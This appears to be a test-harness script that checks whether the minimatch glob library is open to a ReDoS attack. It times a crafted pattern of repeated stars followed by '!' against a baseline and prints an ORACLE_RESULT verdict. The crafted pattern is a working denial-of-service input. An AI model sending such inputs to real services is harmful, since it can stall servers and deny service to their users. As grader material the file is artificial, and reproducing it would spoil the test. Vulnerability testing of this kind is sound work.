'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;

try {
  // Benign operation: a simple extglob pattern match proving the API works.
  const benignSubject = 'aaaaaaaaaa';
  const benignPattern = '*(a)';
  const benignResult = minimatch(benignSubject, benignPattern);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Malicious input: a bounded-size pattern/subject pair known to trigger
  // catastrophic backtracking in minimatch's internal regex conversion
  // for patterns containing many repeated single-character star groups
  // (a classic ReDoS trigger for this CVE). The size N is kept small
  // enough that even the vulnerable implementation finishes within a
  // few seconds, while still being large enough to produce an easily
  // measurable slowdown versus a same-shape benign call.
  const N = 28;
  const maliciousPattern = '*'.repeat(N) + '!';
  // A non-matching subject that forces the engine to exhaust backtracking
  // possibilities before failing.
  const maliciousSubject = 'a'.repeat(N) + 'b';

  // Baseline: a structurally similar but much smaller pattern/subject,
  // used to establish a reference time for comparison. This avoids
  // depending on an interrupting timer and instead uses direct elapsed
  // time measurement via process.hrtime.
  const baselineN = 6;
  const baselinePattern = '*'.repeat(baselineN) + '!';
  const baselineSubject = 'a'.repeat(baselineN) + 'b';

  const baselineStart = process.hrtime.bigint();
  minimatch(baselineSubject, baselinePattern);
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  let errMsg = '';
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
    errMsg = String(e && e.message);
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  const absoluteThresholdMs = 1500; // vulnerable case should clearly exceed this
  const relativeSlowdownFactor = 200; // vulnerable call should be vastly slower than baseline

  let exploit_succeeded;
  let evidence;

  if (!threw && elapsedMs > absoluteThresholdMs && elapsedMs > Math.max(baselineMs, 0.01) * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call took ' + elapsedMs.toFixed(2) + 'ms vs baseline ' + baselineMs.toFixed(3) + 'ms (threshold ' + absoluteThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2) + ' err=' + errMsg;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed quickly (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no ReDoS observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
